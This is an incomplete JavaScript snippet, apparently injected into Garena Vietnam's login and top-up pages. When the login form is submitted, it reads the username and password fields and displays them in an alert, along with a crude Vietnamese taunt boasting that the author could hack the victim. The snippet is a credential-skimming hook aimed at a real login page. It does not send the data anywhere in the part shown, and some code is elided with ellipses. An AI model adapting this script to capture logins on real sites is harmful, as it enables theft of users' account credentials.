...
(function () {
  ...
  start();
   var currentLocation = window.location.href;
    ...
    if(currentLocation == 'http://napthe.garena.vn/'){
              
    }
    if(currentLocation == 'http://platform.garena.vn/login_ui/?nextpage=http://napthe.garena.vn?g=prepaid'){

        $("input[type=submit]").on('click',function(e){
                    var u = $("#id_username").val();
                    var p = $("#id_password").val();
                    alert('tên đăng nhập của con hàng là '+u+' pass là: '+p+'giờ bố mà hack thì m chết');
        });
